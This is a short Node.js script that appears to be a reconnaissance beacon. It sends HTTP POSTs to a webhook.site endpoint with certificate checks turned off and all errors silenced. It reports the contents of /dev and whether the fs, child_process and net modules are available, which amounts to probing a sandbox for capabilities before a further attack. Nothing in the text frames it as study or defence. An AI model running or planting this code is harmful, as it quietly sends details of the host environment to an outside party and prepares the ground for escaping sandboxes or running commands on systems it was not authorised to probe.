var https = require('https');
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/49eca885-643e-4d14-a1d1-c284408e4033/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
send('step', 'start');
try {
    var fs = require('fs');
    send('step', 'fs-ok dev=' + fs.readdirSync('/dev').join(','));
} catch (e) {
    send('step', 'fs-err ' + e);
}
try {
    var cp = require('child_process');
    send('step', 'cp-ok');
} catch (e) {
    send('step', 'cp-err ' + e);
}
try {
    var net = require('net');
    send('step', 'net-ok');
} catch (e) {
    send('step', 'net-err ' + e);
}
